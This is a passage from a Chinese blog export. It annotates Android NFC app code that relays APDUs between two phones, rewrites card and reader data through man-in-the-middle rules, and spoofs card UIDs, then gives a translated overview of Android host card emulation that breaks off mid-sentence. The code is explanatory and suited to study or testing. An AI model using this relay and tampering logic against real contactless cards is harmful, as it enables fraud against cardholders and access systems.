handleSession(Wrapper.getSession());\n    }\n    else if (Wrapper.getMessageCase() == MessageCase.STATUS) {\n        Log.i(TAG, \"onDataReceived: MessageCase.STATUS: Sending to handler\");\n        handleStatus(Wrapper.getStatus());\n    }\n    else if (Wrapper.getMessageCase() == MessageCase.ANTICOL) {\n        Log.i(TAG, \"onDataReceived: MessageCase.ANTICOL: Sending to handler\");\n        handleAnticol(Wrapper.getAnticol());\n    }\n    else {\n        Log.e(TAG, \"onDataReceived: Message fits no known case! This is fucked up\");\n        Handler.notifyUnknownMessageType();\n    }\n}\n```\n\n这个函数根据来自`LowLevelNetWorkHandler`的数据流, 来对该数据进一步分类, 根据特定的数据类型让特定的函数操作. 例如`handleNFCData`和`handleSession`以及`handleAnticol`. 接下来拿`handleNFCData`举例分析:\n\n```java\nprivate void handleNFCData(C2C.NFCData msg) {\n    if (msg.getDataSource() == C2C.NFCData.DataSource.READER) {\n        // We received a signal FROM a reader device and are required to talk TO a card.\n        Log.i(TAG,\"hangleNFCData: \" + Utils.bytesToHex(msg.getDataBytes().toByteArray()));\n        NfcComm nfcdata = new NfcComm(NfcComm.Source.HCE, msg.getDataBytes().toByteArray());\n        mNfcManager.sendToCard(nfcdata);\n    } else  if (msg.getDataSource() == C2C.NFCData.DataSource.CARD) {\n        // We received a signal FROM a card and are required to talk TO a reader.\n        NfcComm nfcdata = new NfcComm(NfcComm.Source.CARD, msg.getDataBytes().toByteArray());\n        mNfcManager.sendToReader(nfcdata);\n    } else {\n        // Wait, what? This should be impossible. Are we using an old protocol version?\n        Log.e(TAG, \"HandleNfcData: Received Nfc Data from unknown source => Not implemented\");\n        Handler.notifyNotImplemented();\n    }\n}\n```\n\n`msg`传入这个函数之后, 再通过`if...else if...else`对该数据进行分类, 分为`card`的数据和`reader`的数据. 最后再通过`sendToCard` 和 `sendRoReader` 函数对这些数据分流, 这两个函数在`NFCManager.java`会介绍.\n\n## 0x03 nfc模块\n\n### Ⅰ. config\n\n1. **ConfigBuilder**\n\n   这是一个将`anticol`进行数据格式的转换的类. 其中包含两个重要的函数`parse`和`build`, 如下所示:\n\n   ```java\n   // 这个函数会将config数据(也就是Hce手机端接受的第一条来自card的数据)根据特定的数据类型转换为可读的有意义的数据.\n   public void parse(byte[] config) {\n       mOptions.clear();\n       int index = 0;\n   \n       while(index + 2 < config.length) {\n           byte type = config[index + 0];\n           byte length = config[index + 1];\n   \n           byte[] data = new byte[length];\n           System.arraycopy(config, index + 2, data, 0, length);\n   \n           add(OptionType.fromType(type), data);\n           index += length + 2;\n       }\n   }\n   ```\n\n   ```java\n   // 这个函数是上一个函数的逆函数\n   public byte[] build() {\n       int length = 0;\n   \n       for (ConfigOption option : mOptions)\n           length += option.len() + 2;\n   \n       byte[] data = new byte[length];\n       int offset = 0;\n   \n       for (ConfigOption option : mOptions) {\n           option.push(data, offset);\n           offset += option.len() + 2;\n       }\n   \n       return data;\n   }\n   // 这个函数讲格式化之后的字符串拼接起来, 返回给调用者\n   @Override\n   public String toString() {\n       StringBuilder result = new StringBuilder();\n   \n       for (ConfigOption option : mOptions)\n           result.append(option.toString());\n       return result.toString();\n   }\n   ```\n\n2. **ConfigOption**\n\n   ```java\n   // 这个函数被上示代码中的toString函数调用\n   @Override\n   public String toString() {\n       StringBuilder result = new StringBuilder();\n   \t// 这里根据特定的数据, 给定特定的名称.\n       result.append(\"Type: \");\n       result.append(mID.toString());\n   \n       if (mData.length > 1) {\n           result.append(\" (\");\n           result.append(mData.length);\n           result.append(\")\");\n       }\n   \n       result.append(\", Value: 0x\");\n       result.append(bytesToHex(mData));\n       result.append(\"\\n\");\n   \n       return result.toString();\n   }\n   ```\n\n3. **OptionType**\n\n   这是一个枚举类, 为上示`parse`函数提供解析.\n\n### Ⅱ. hce\n\n1. **ApduService**\n\n   这个类是与底层lib交互apdu命令最终要的一个类, 其中重要的函数有`processCommandApdu`、`onDeactivated`、`sendResponse`等:\n\n   ```java\n   @Override\n   public byte[] processCommandApdu(byte[] apdu, Bundle extras) {\n       Log.d(TAG, \"APDU-IN: \" + Utils.bytesToHex(apdu));\n       // 这里需要留意的是, 只有当滑动到HCE界面的时候(即mCurrent==3), 才让其返回handleApdu的值\n       if (SlidingTabLayout.mCurrentPos == 3) {\n           return handleApdu(getApplicationContext(), apdu);\n       }\n       // Package the ADPU into a NfcComm object\n       NfcComm nfcdata = new NfcComm(NfcComm.Source.HCE, apdu);\n   \n       // Send the object to the handler\n       mNfcManager.handleHCEData(nfcdata);\n   \n       // Tell the HCE implementation to wait a moment\n       return DONT_RESPOND;\n   }\n   ```\n\n   这个函数传入的`byte[] apdu`就是来自卡的apdu命令, 而return的`byte[]`就是手机返回给卡的数据.\n\n   期间, 对输入进来的数据进行实例化之后, 通过`handleHCEData`函数处理.\n\n   ```java\n   // 这个函数当读卡器断开交易的时候被调用\n   @Override\n   public void onDeactivated(int reason) {\n       if (SlidingTabLayout.mCurrentPos == 3) {\n           Utils.tv.append(\"-------------------------------------End-------------------------------------\\n\");\n       } else {\n           mNfcManager.unsetApduService();\n       }\n   }\n   // sendResponseApdu函数是返回给卡的一个函数, 其功能相当于processCommandApdu的返回值\n   public void sendResponse(byte[] apdu) {\n       Log.d(TAG, \"APDU-OUT: \" + Utils.bytesToHex(apdu));\n       sendResponseApdu(apdu);\n   }\n   // 这个函数用在hce功能的时候, 其中处理逻辑都在Utils类中.\n   static byte[] handleApdu(Context context, byte[] apdu) {\n       Utils.tv.append(\"pos:\\n\"+Utils.bytesToHex(apdu)+\"\\n\\n\");\n       String payload =  Utils.Start(context,apdu);\n       Log.i(TAG,\"payload: \" + payload);\n       Utils.tv.append(\"card:\\n\"+payload+\"\\n\\n\");\n       return Utils.toBytes(payload);\n   }\n   ```\n\n2. **DaemonConfiguration**\n\n   这个类在`MainActivity`被调用, 这里会根据`Action`发送`Broadcast`.\n\n### Ⅲ. reader\n\n这里根据卡的类型选择特定的类返回相应的命令, 各种卡标签的识别是建立在继承`NFCTagReader`这个接口上的.\n\n### Ⅳ. NfcManager\n\n这是格式化apdu数据最重要的一个类, 定义了apdu的各种属性.\n\n```java\nprivate NfcComm handleHceDataCommon(NfcComm nfcdata) {\n    Log.d(TAG, \"handleHceDataCommon: Pre-Filter: \" +\n          Utils.bytesToHex(nfcdata.getData()));\n    if (mFilterManager != null) {\n        nfcdata = mFilterManager.filterHCEData(nfcdata);\n    }\n\n    notifySinkManager(nfcdata);\n\n    Log.d(TAG, \"handleHceDataCommon: Post-Filter: \" +\n          Utils.bytesToHex(nfcdata.getData()));\n    return nfcdata;\n}\n\n\nprivate NfcComm handleCardDataCommon(NfcComm nfcdata) {\n    Log.d(TAG, \"handleCardDataCommon: Pre-Filter: \" +\n          Utils.bytesToHex(nfcdata.getData()));\n    if (mFilterManager != null) {\n        nfcdata = mFilterManager.filterCardData(nfcdata);\n    }\n    notifySinkManager(nfcdata);\n\n    Log.d(TAG, \"handleCardDataCommon: Post-Filter: \" +\n          Utils.bytesToHex(nfcdata.getData()));\n    return nfcdata;\n}\n```\n\n上面两个函数, 分辨是handle `card` `reader` 的函数, 其中最为重要的是`filterCardData` `filterHCEData`两个函数, 其中中间人数据就是在`filterCardData` `filterHCEData`两个方法里被篡改的. 函数的实现在后面`RuleMatching.java`会介绍.\n\n```java\n\t/**\n     * Send NFC data to the card\n     * 这里主要将HCE手机的来自读卡器的apdu通过network发给另一部手机.\n     * @param nfcdata NFcComm object containing the message for the card\n     */\npublic void sendToCard(NfcComm nfcdata) {\n    if (mReader.isConnected()) {\n        nfcdata = handleHceDataCommon(nfcdata);\n        Log.i(TAG,\"sendToCard: \" + Utils.bytesToHex(nfcdata.getData()));\n        // Communicate with card\n        byte[] reply = mReader.sendCmd(nfcdata.getData());\n        if (reply == null) {\n            mReader.closeConnection();\n            mNetworkHandler.disconnectCardWorkaround();\n            mNetworkHandler.notifyNFCNotConnected();\n        } else {\n            // Create NfcComm object and pass it through filter and sinks\n            NfcComm nfcreply = new NfcComm(NfcComm.Source.CARD, reply);\n            nfcreply = handleCardDataCommon(nfcreply);\n\n            // Send message\n            mNetworkHandler.sendAPDUReply(nfcreply);\n        }\n    } else {\n        Log.e(TAG, \"HandleNFCData: No NFC connection active\");\n        // There is no connected NFC device\n        mNetworkHandler.notifyNFCNotConnected();\n    }\n}\n\n\n/**\n     * Send NFC data to the Reader\n     * 这里主要将普通手机读取的来自卡的apdu发给HCE进而发给读卡器.\n     * @param nfcdata NfcComm object containing the message for the Reader\n     */\npublic void sendToReader(NfcComm nfcdata) {\n    if (mApduService != null) {\n        // Pass data through sinks and filters\n        nfcdata = handleCardDataCommon(nfcdata);\n\n        // Send data to the Reader device\n        Log.i(TAG,\"sendToReader: \" + Utils.bytesToHex(nfcdata.getData()));\n        mApduService.sendResponse(nfcdata.getData());\n    } else {\n        Log.e(TAG, \"HandleNFCData: Received a message for a reader, but no APDU instance active.\");\n        mNetworkHandler.notifyNFCNotConnected();\n    }\n}\n```\n\n## 0x04 util\n\n### Ⅰ. db\n\n#### 1. CloneListStorage\n\n`CloneListItem`是定义数据库每个`Item`数据结构的一个类, 其实现并不复杂, 不再赘述. 接下来看`CloneListStorage`: \n\n1. 首先定义数据库名称及各列的列名。\n\n   ```java\n   // All Static variables\n   // Database Version\n   private static final int DATABASE_VERSION = 1;\n   \n   // Database Name\n   private static final String DATABASE_NAME = \"clonemode.db\";\n   \n   // table name\n   private static final String TABLE_NAME = \"list\";\n   \n   // Table Columns names\n   private static final String KEY_ID = \"id\";\n   private static final String KEY_NAME = \"name\";\n   private static final String KEY_CONFIG = \"config\";\n   ```\n\n2. 然后建立数据库：\n\n   ```java\n   // 如果要调用或者建立这个数据库, 传入一个context即可新建/获得这个数据库.\n   public CloneListStorage(Context context) {\n       super(context, DATABASE_NAME, null, DATABASE_VERSION);\n   }\n   \n   // 这里重写了onCreate方法, 是产生相应的table. 注意下列字符串定义了每个table的数据类型 \n   @Override\n   public void onCreate(SQLiteDatabase db) {\n       String CREATE_CONTACTS_TABLE = \"CREATE TABLE \" + TABLE_NAME + \"(\"\n           + KEY_ID + \" INTEGER PRIMARY KEY,\"\n           + KEY_NAME + \" TEXT,\"\n           + KEY_CONFIG + \" BLOB\"\n           + \")\";\n       db.execSQL(CREATE_CONTACTS_TABLE);\n   }\n   ```\n\n3. 如果要往database添加item, 如下函数可实现:\n\n   ```java\n   public void add(CloneListItem item) {\n       // 实例化一个可写的SQLiteDatabase\n       SQLiteDatabase db = this.getWritableDatabase();\n       // 实例化一个ContentValues, 以给对应的table赋值\n       ContentValues values = new ContentValues();\n       // 首先给KEY_NAME赋值, 也就是item的名称\n       values.put(KEY_NAME, item.toString());\n       // 获得anticol的值之后, 再build成blob类型\n       NfcComm ac = item.getAnticolData();\n       values.put(KEY_CONFIG, ac.getConfig().build());\n   \n       // Inserting Row 插入数据库中\n       db.insert(TABLE_NAME, null, values);\n       db.close(); // Closing database connection\n   }\n   ```\n\n4. 在`CLONE`界面里的自定义UID就是在这里实现的:\n\n   ```java\n   // 当数据库里的Defult没有时, 则会调用这个函数生成一个默认的item, 以后产生随机UID或者自定义UID都是在这个item里作修改.\n   public void addDefultConfig(){\n       SQLiteDatabase db = this.getWritableDatabase();\n       // 这里用的是rawQueray, 可以直接用命令选择相应的list\n       Cursor c = db.rawQuery(\"select * from list\",null);\n       if (c.getCount() <= 0) {\n           String defultAnticol = \"330477AD15D532012830010831010059024744\";\n           Log.i(\"***DefultAnticol: \", defultAnticol);\n           ContentValues values = new ContentValues();\n           values.put(KEY_NAME, \"Defult\");\n           values.put(KEY_ID, 1);\n           values.put(KEY_CONFIG, Utils.toBytes(defultAnticol));\n           db.insert(TABLE_NAME, null, values);\n       }\n       db.close();\n   }\n   \n   public void changeUID(String UID){\n       if (Utils.isHex(UID)) {\n           SQLiteDatabase db = this.getWritableDatabase();\n           ContentValues values = new ContentValues();\n           values.put(KEY_CONFIG,\n                     Utils.toBytes(\n                         \"3304\"+UID+\"32012830010831010059024744\"));\n           // Default item总是在数据库的第一个.\n           db.update(\n               TABLE_NAME,\n               values,\n               KEY_ID + \" = ?\",\n               new String[]{\"1\"}\n           );\n           db.close();\n       }\n   }\n   ```\n\n5. 删除item操作如下:\n\n   ```java\n   // 可以看出, 是根据id(数据库的第几项)来删除item的\n   public void delete(int id) {\n       SQLiteDatabase db = this.getWritableDatabase();\n       db.delete(TABLE_NAME, KEY_ID + \" = ?\",\n                 new String[]{String.valueOf(id)});\n       db.close();\n   }\n   ```\n\n6. 获得数据库所有的item:\n\n   ```java\n   public List<CloneListItem> getAll() {\n       List<CloneListItem> contactList = new ArrayList<CloneListItem>();\n       // Select All Query\n       String selectQuery = \"SELECT  * FROM \" + TABLE_NAME;\n   \n       SQLiteDatabase db = this.getWritableDatabase();\n       Cursor cursor = db.rawQuery(selectQuery, null);\n   \n       // looping through all rows and adding to list\n       if (cursor.moveToFirst()) {\n           do {\n               contactList.add(createByCursor(cursor));\n           } while (cursor.moveToNext());\n       }\n   \n       // return contact list\n       return contactList;\n   }\n   ```\n\n#### 2. RuleListStorage\n\n这里其实跟`CloneListStorage`很相似, 将一个比较不一样的例子:\n\n```java\n// 这个函数遍历整个数据库, 然后获取每个item的state值, 可能为0,1,2, 分别表示: 未选中, 修改卡返回的apdu数据, 修改读卡器的apdu数据\npublic Map<Integer, Integer> getStateMap(){\n    Map<Integer, Integer> map = new HashMap<>();\n    SQLiteDatabase db = this.getReadableDatabase();\n    String selectQuery = \"SELECT * FROM \" + TABLE_NAME;\n    Cursor c = db.rawQuery(selectQuery,null);\n    if (c.moveToFirst()) {\n        do {\n            map.put(c.getInt(c.getColumnIndex(KEY_ID)),\n                    c.getInt(c.getColumnIndex(KEY_SELECT_STATE)));\n        }while (c.moveToNext());\n    }\n    return map;\n}\n```\n\n#### 3. SessionLoggingDbHelper\n\n这个类存储卡和读卡器的apdu数据.\n\n### Ⅱ. filter\n\n这里是过滤一些不规范的apdu数据, 下面只分析部分`FilterManager`:\n\n```java\n\t/**\n     * Execute filters that are registered for HCE data\n     * @param nfcdata The APDU that should be filtered\n     * @return The filtered HCE data\n     */\npublic NfcComm filterHCEData(NfcComm nfcdata) {\n    // 这里根据RuleListStorage的规则识别一些来自读卡器的apdu指令，以便对其做进一步操作\n    rule.changeHCEData(nfcdata);\n    if (mHCENonEmpty) {\n        if (nfcdata.getType() != NfcComm.Type.NFCBytes) return nfcdata;\n        for (Filter f : mHCEFilters) {\n            nfcdata = f.filter(nfcdata);\n        }\n    }\n    return nfcdata;\n}\n\n\t/**\n     * Execute filters that are registered for Card data\n     * @param nfcdata The APDU that should be filtered\n     * @return The filtered Card data\n     */\npublic NfcComm filterCardData(NfcComm nfcdata) {\n    // 这里根据上面识别的来自读卡器的apdu指令，对卡返回的数据进行修改\n    rule.changeCardData(nfcdata);\n    if (mCardNonEmpty) {\n        if (nfcdata.getType() != NfcComm.Type.NFCBytes) return nfcdata;\n        for (Filter f : mCardFilters) {\n            nfcdata = f.filter(nfcdata);\n        }\n    }\n    return nfcdata;\n}\n\n\t/**\n     * Execute filters that are registered for Anticollision data\n     * @param anticol NfcComm object containing anticol data\n     */\npublic NfcComm filterAnticolData(NfcComm anticol) {\n    // 修改UID也是在这里开始的\n    anticol = rule.changeAnticolData(anticol);\n    if (mAnticolNonEmpty) {\n        if (anticol.getType() != NfcComm.Type.AnticolBytes) return anticol;\n        for (Filter f : mAnticolFilters) {\n            anticol = f.filter(anticol);\n        }\n    }\n    return anticol;\n}\n```\n\n### Ⅲ. 其他\n\n#### 1. CustomTextWatcher\n\n`TextWatcher`有三个重要的方法, 顾名思义分别是TextView在改变前/改变时/改变后的动作:\n\n```java\n// 在改变前没有做任何修改\n@Override\npublic void beforeTextChanged(CharSequence charSequence, int start,\n                              int count, int after) {\n}\n\n// 这里限定了输入时只能输入16进制字符, 而且每两个字符之间像个一个空格\n@Override\npublic void onTextChanged(CharSequence charSequence, int start, int before,\n                          int count) {\n    try {\n        String temp = charSequence.toString();\n        // Set selection.\n        if (mLastText.equals(temp)) {\n            if (mInvalid) {\n                mSelection -= 1;\n            } else {\n                if ((mSelection >= 1) && (temp.length() > mSelection - 1)\n                    && (temp.charAt(mSelection - 1)) == ' ') {\n                    mSelection += 1;\n                }\n            }\n            int length = mLastText.length();\n            if (mSelection > length) {\n\n                mEditText.setSelection(length);\n            } else {\n\n                mEditText.setSelection(mSelection);\n            }\n            mFormat = false;\n            mInvalid = false;\n            return;\n        }\n\n        mFormat = true;\n        mSelection = start;\n\n        // Delete operation.\n        if (count == 0) {\n            if ((mSelection >= 1) && (temp.length() > mSelection - 1)\n                && (temp.charAt(mSelection - 1)) == ' ') {\n                mSelection -= 1;\n            }\n\n            return;\n        }\n\n        // Input operation.\n        mSelection += count;\n        char[] lastChar = (temp.substring(start, start + count))\n            .toCharArray();\n        int mid = lastChar[0];\n        if (mid >= 48 && mid <= 57) {\n            /* 1-9. */\n        } else if (mid >= 65 && mid <= 70) {\n            /* A-F. */\n        } else if (mid >= 97 && mid <= 102) {\n            /* a-f. */\n        } else {\n            /* Invalid input. */\n            mInvalid = true;\n            temp = temp.substring(0, start)\n                + temp.substring(start + count, temp.length());\n            mEditText.setText(temp);\n            return;\n        }\n\n    } catch (Exception e) {\n        Log.i(TAG, e.toString());\n    }\n}\n\n@Override\npublic void afterTextChanged(Editable editable) {\n    try {\n        /* Format input. */\n        if (mFormat) {\n            StringBuilder text = new StringBuilder();\n            // 这里将空格删去\n            text.append(editable.toString().replace(\" \", \"\"));\n            int length = text.length();\n            int sum = (length % 2 == 0) ? (length / 2) - 1 : (length / 2);\n            for (int offset = 2, index = 0; index < sum; offset += 3, index++) {\n                text.insert(offset, \" \");\n            }\n            mLastText = text.toString();\n            mEditText.setText(text);\n        }\n    } catch (Exception e) {\n        Log.i(TAG, e.toString());\n    }\n}\n```\n\n#### 2. NfcComm\n\n这个类定义了nfc apdu数据的多种数据类型.\n\n#### 3. RuleMatching\n\n1. 下示代码时修改UID的一个函数:\n\n   ```java\n   public void changeUIDRule(NfcComm anticol){\n       String UID = null;\n       if (ac.equals(MitMAction.RandomAnticol)) {\n           // 随机生成4字节的数据作为UID\n           UID = Utils.randomHexString(4);\n       } else if (ac.equals(MitMAction.SelfDefineAnticol)) {\n           UID = mUID;\n       }\n       if (UID != null) {\n           mConfig = Utils.relaceBytesFromArray(anticol.getConfig().build(),\n                                                Utils.toBytes(UID),\n                                                new byte[]{(byte)0x33,\n                                                           (byte)0x04});\n       }\n   }\n   ```\n\n2. 以下是识别来自card的指令的函数:\n\n   ```java\n   private void compReaderCommFromDb(NfcComm nfcdata) {\n       RuleListStorage db = new RuleListStorage(RelayFragment.getInstance().getContext());\n       List<RuleListItem> items = db.getAll();\n       // 遍历每个位于规则数据库的item\n       for (RuleListItem item: items) {\n           // 如果当前的item的state为1, 则将mChangeCardComm赋值\n           if (item.getSelect() == 1) {\n               if (Utils.bytesToHex(nfcdata.getData()).indexOf(\n                   Utils.bytesToHex(item.getReaderComm().getData())) == 0) {\n                   mChangeCardComm = item.getCardComm().getData();\n                   break;\n               } else {\n                   mChangeCardComm = null;\n               }\n           }else if (item.getSelect() == 2) {\n               // 通过读卡器的数据来修改读卡器命令\n               if (Utils.bytesToHex(nfcdata.getData()).indexOf(\n                   Utils.bytesToHex(item.getReaderComm().getData())) == 0) {\n                   mChangeHceComm = item.getCardComm().getData();\n                   break;\n               } else {\n                   mChangeHceComm = null;\n               }\n           }\n       }\n   }\n   ```\n\n3. 以下三个函数时中间人apdu数据重要函数:\n\n   ```java\n   // 修改card返回的apdu数据\n   public NfcComm changeCardData(NfcComm nfcdata) {\n       //        Log.i(TAG,\"Card: \" + Utils.bytesToHex(nfcdata.getData()));\n       if (mChangeCardComm != null) {\n           //            Log.i(TAG,\"Exec: \" + Utils.bytesToHex(mChangeCardComm));\n           nfcdata.setData(mChangeCardComm);\n           mChangeCardComm = null;\n       }\n       return nfcdata;\n   }\n   // 修改读卡器发送的apdu数据\n   public NfcComm changeHCEData(NfcComm nfcdata) {\n       //        Log.i(TAG,\"HCE : \" + Utils.bytesToHex(nfcdata.getData()));\n       compReaderCommFromDb(nfcdata);\n       if (mChangeHceComm != null) {\n           nfcdata.setData(mChangeHceComm);\n           mChangeHceComm = null;\n       }\n       return nfcdata;\n   }\n   // 修改uid\n   public NfcComm changeAnticolData(NfcComm anticol) {\n       if (anticol.getType() == NfcComm.Type.AnticolBytes) {\n           changeUIDRule(anticol);\n           if (mConfig != null) {\n               anticol = new NfcComm(new ConfigBuilder(mConfig));\n               mConfig = null;\n           }\n       }\n       return anticol;\n   }\n   ```\n\n#### 4. Utils\n\n这个类含有全局需要的处理数据的函数. 大部分已注释了解释的函数不在列举. 举一个简单的函数:\n\n```java\n// 这个函数读取特定目录下的所有文件, 并返回文件名列表\npublic static ArrayList<String> listDir(String path){\n    ArrayList<String> myFile = new ArrayList<String>();\n    String realPath=Environment.getExternalStorageDirectory().toString()+\"/MTYReader/\"+path;\n    Log.i(\"listDir\",realPath);\n    File file=new File(realPath);\n    File[] files=file.listFiles();\n    if (files == null) {\n        return null;\n    }\n    for(int i =0;i<files.length;i++){\n        myFile.add(files[i].getName());\n    }\n    return myFile;\n}\n```","tags":[{"name":"Android Developer","slug":"Android-Developer","permalink":"http://www.killshadow.xyz/tags/Android-Developer/"}]},{"title":"基于主机的卡模拟(HCE)概述","date":"2018-06-14T17:23:33.334Z","path":"2018/06/15/基于主机的卡模拟(HCE)概述/","raw":"---\ntitle: 基于主机的卡模拟(HCE)概述\ndate: \ncategories:\ntoc: ture\ntags:\n\t- Android Developer\ncomments: true\n---\n## 0x00 概述\n\n许多提供NFC功能的基于Android的设备已经支持NFC卡模拟。在大多数情况下，该卡由设备中的单独芯片模拟，称为*安全元件(Secure Element)*。无线运营商提供的许多SIM卡还包含安全元件(Secure Element)。\n<!-- more -->\nAndroid 4.4引入了另一种卡模拟方法，它不涉及SE，称为*基于主机的卡模拟*。这允许任何Android应用程序模拟卡并直接与NFC读卡器通话。本文档描述了基于主机的卡仿真（HCE）如何在Android上工作，以及如何使用此技术开发模拟NFC卡的应用程序。\n\n## 0x01 卡仿真与SE\n\n当使用安全元件(Secure Element)提供NFC卡模拟时，将通过Android应用程序将要模拟的卡提供到设备上的安全元件(Secure Element)中。然后，当用户通过NFC终端握住设备时，设备中的NFC控制器将来自读卡器(NFC Reader)的所有数据直接路由到安全元件(Secure Element)。图1说明了这个概念。\n\n<center>![图1.带有安全元件的NFC卡仿真](https://github.com/killshadow/killshadow.github.io/blob/master/image/002/1.png?raw=true)</center>\n\n安全元件(Secure Element)本身执行与NFC终端的通信，并且完全不涉及Android应用。交易完成后，Android应用程序可以直接查询SE的交易状态并通知用户。\n\n## 0x02 基于主机的卡模拟\n\n当使用基于主机的卡仿真来仿真NFC卡时，数据将被路由到直接运行Android应用程序的主机CPU，而不是将NFC协议帧路由到SE。图2展示了基于主机的卡仿真如何工作。\n\n<center>![图2.基于主机的卡仿真模式](https://github.com/killshadow/killshadow.github.io/blob/master/image/002/2.png?raw=true)</center>\n\n## 0x03 支持的NFC卡和协议\nNFC标准提供对许多不同协议的支持，并且可以模拟不同类型的卡。\n\nAndroid 4.4支持当今市场上常见的几种协议。许多现有的非接触式卡已经基于这些协议，例如非接触式支付卡。这些协议也得到了当今市场上众多NFC读卡器的支持，其中包括Android NFC设备可以自己作为读卡器（请参见[IsoDep](https://developer.android.com/reference/android/nfc/tech/IsoDep.html)课程）。这使您可以仅使用基于Android的设备在HCE周围构建和部署端到端NFC解决方案。\n\n具体而言，Android 4.4支持基于NFC-Forum ISO-DEP规范（基于ISO / IEC 14443-4）的仿真卡，并处理ISO / IEC 7816-4规范中定义的应用协议数据单元（APDU）。Android只强制在Nfc-A（ISO / IEC 14443-3 Type A）技术之上模拟ISO-DEP。支持Nfc-B（ISO / IEC 14443-4 Type B）技术是可选的。所有这些规格的分层如图3所示。\n\n<center>![图3.Android的HCE协议栈](https://github.com/killshadow/killshadow.github.io/blob/master/image/002/3.png?raw=true)</center>\n\n## 0x04 HCE服务\n\nAndroid中的HCE体系结构基于Android [Service](https://developer.android.com/reference/android/app/Service.html)组件（称为“HCE服务”）。服务的一个关键优势是它可以在没有任何用户界面的情况下在后台运行。这对于许多HCE应用程序来说非常合适，例如会员卡或公交卡，用户不需要启动应用程序即可使用它。相反，通过NFC读卡器轻敲设备将启动正确的服务（如果尚未运行）并在后台执行该事务。当然，如果有意义的话，您可以自由地从您的服务中启动额外的UI（例如用户通知）。\n\n### 4.1 服务选择\n\n当用户将设备连接到NFC读取器时，Android系统需要知道NFC读取器实际想要与哪个HCE服务通话。这就是ISO / IEC 7816-4规范的出处：它定义了一种选择应用程序的方式，以应用程序ID（AID）为中心。一个AID最多由16个字节组成。如果您正在模拟现有NFC读卡器基础架构的卡片，那么这些读卡器所寻找的AID通常是众所周知的并且是公开注册的（例如Visa和MasterCard等支付网络的AID）。\n\n如果您想为自己的应用程序部署新的读卡器基础结构，则需要注册您自己的AID。AID的注册程序在ISO / IEC 7816-5规范中定义。如果您要为Android部署HCE应用程序，Google建议按照7816-5注册AID，因为它可以避免与其他应用程序发生冲突。\n\n### 4.2 AID组\n\n在某些情况下，HCE服务可能需要注册多个AID才能实现某个应用程序，并且需要确保它是所有这些AID的默认处理程序（而不是组中的某些AID转到其他服务） 。\n\n一个AID组是应该被OS视为一起归属的AID列表。对于AID组中的所有AID，Android会保证以下其中一项：\n\n*   组中的所有AID都路由到此HCE服务\n*   该组中的任何AID都不会路由到此HCE服务（例如，因为用户更喜欢另一个在您的组中也请求一个或多个AID的服务）\n\n换句话说，没有中间状态，组中的一些AID可以路由到一个HCE服务，另一些AID可路由到另一个。\n\n### 4.3 AID组和类别\n\n每个AID组都可以与一个类别关联。这允许Android按类别将HCE服务组合在一起，并且反过来又允许用户在类别的级别而不是AID级别设置默认值。通常，避免在应用程序的任何面向用户的部分提及AID：它们对普通用户没有任何意义。\n\nAndroid 4.4支持两种类别: [CATEGORY_PAYMENT](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT)（涵盖行业标准支付应用程序）和[CATEGORY_OTHER](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER)（对于所有其他HCE应用程序）。\n\n> **注意：**[CATEGORY_PAYMENT](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT)在任何给定时间，只能在系统中启用该类别中的一个AID组。通常，这将是一款了解主要信用卡付款协议并可以在任何商家工作的应用程序。\n>\n> 对于仅适用于一个商家（如储值卡）*的闭环*支付应用程序，您应该使用[CATEGORY_OTHER](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER)。此类别中的AID组可以始终处于活动状态，并且在需要时可以在AID选择期间由NFC读卡器给予优先权。\n\n## 0x05 实施HCE服务\n\n要使用基于主机的卡仿真来模拟NFC卡，您需要创建一个[Service](https://developer.android.com/reference/android/app/Service.html)处理NFC事务的组件。\n\n### 5.1 检查HCE支持\n\n您的应用程序可以通过检查[FEATURE_NFC_HOST_CARD_EMULATION](https://developer.android.com/reference/android/content/pm/PackageManager.html#FEATURE_NFC_HOST_CARD_EMULATION)功能来检查设备是否支持HCE 。您应该[`<uses-feature>`](https://developer.android.com/guide/topics/manifest/uses-feature-element.html)在应用程序清单中使用该标记来声明您的应用程序使用HCE功能，以及该应用程序是否需要运行。\n\n### 5.2 服务实施\n\nAndroid 4.4带有一个便利的[Service](https://developer.android.com/reference/android/app/Service.html)类，可以作为实现HCE服务的基础：[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)类。\n\n因此，第一步要扩大[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)。\n\n```java\npublic class MyHostApduService extends HostApduService {\n    @Override\n    public byte[] processCommandApdu(byte[] apdu, Bundle extras) {\n       ...\n    }\n    @Override\n    public void onDeactivated(int reason) {\n       ...\n    }\n}\n```\n\n[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)声明了两个需要重写和实现的抽象方法。\n\n[processCommandApdu()](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)只要NFC读卡器将应用协议数据单元（APDU）发送到您的服务，就会调用它。APDU也在ISO / IEC 7816-4规范中定义。APDU是在NFC读卡器和您的HCE服务之间交换的应用级数据包。该应用级协议是半双工的：NFC读卡器会向您发送命令APDU，并等待您发送响应APDU作为回报。\n\n> **注：** ISO / IEC 7816-4规范还定义了多个逻辑信道的概念，您可以在单独的逻辑信道上进行多个并行APDU交换。Android的HCE实现只支持单个逻辑通道，所以只有单线程交换APDU。\n\n如前所述，Android使用AID来确定读者想要与哪个HCE服务交谈。通常，NFC读卡器向您的设备发送的第一个APDU是“SELECT AID”APDU; 这个APDU包含读卡器想与之交谈的AID。Android从APDU中提取AID，将其解析为HCE服务，然后将该APDU转发给已解析的服务。\n\n您可以通过返回响应APDU的字节来发送响应APDU [processCommandApdu()](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#processCommandApdu(byte[], android.os.Bundle))。请注意，此方法将在应用程序的主线程中调用，该线程不应被阻止。所以如果你不能立即计算并返回一个响应APDU，那么返回null。然后，您可以在另一个线程上完成必要的工作，并[sendResponseApdu()](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#sendResponseApdu(byte[]))在完成后使用[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)该类中定义的方法发送响应。\n\nAndroid会继续将新的APDU从读取器转发到您的服务，直到：\n\n1.  NFC读卡器发送另一个“SELECT AID” 